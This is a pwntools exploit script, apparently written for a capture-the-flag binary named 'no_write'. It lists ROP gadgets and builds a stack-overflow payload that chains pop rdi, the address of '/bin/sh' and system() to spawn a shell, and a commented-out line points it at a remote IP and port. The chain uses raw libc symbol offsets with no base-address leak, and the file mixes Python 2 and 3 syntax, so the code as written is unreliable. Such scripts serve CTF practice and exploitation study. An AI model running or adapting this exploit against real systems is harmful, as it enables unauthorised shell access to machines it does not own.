from pwn import *

'''
gadget
0x00000000004005e2 : mov byte ptr [rip + 0x200a8f], 1 ; pop rbp ; ret
0x000000000040076c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400770 : pop r14 ; pop r15 ; ret
0x0000000000400772 : pop r15 ; ret
0x000000000040076b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400773 : pop rdi ; ret
0x0000000000400771 : pop rsi ; pop r15 ; ret
0x000000000040076d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004be : ret
0x0000000000400658 : ret 0x2be

'''
context(log_level='debug')
#p=process('./no_write')
p=process('./no_write', env={'LD_PRELOAD':'./libc.so.6'})
#p=remote('124.156.135.103', 6000)
elf=ELF('./no_write')
libc=ELF('./libc.so.6')
system = libc.symbols['system']
print "system : " + hex(system)

read_plt = elf.plt['read']
print "read_plt : " + hex(read_plt)



binsh_libc = libc.search("/bin/sh").next()
binsh = next(libc.search(b"/bin/sh"))

print "binsh_libc : " + hex(binsh_libc)

pop_rdi=0x0000000000400773


#gdb.attach(p, 'b *0x4006E7')
#raw_input()

payload='a'*256
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
'''
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
'''


p.sendline(payload)

p.interactive()

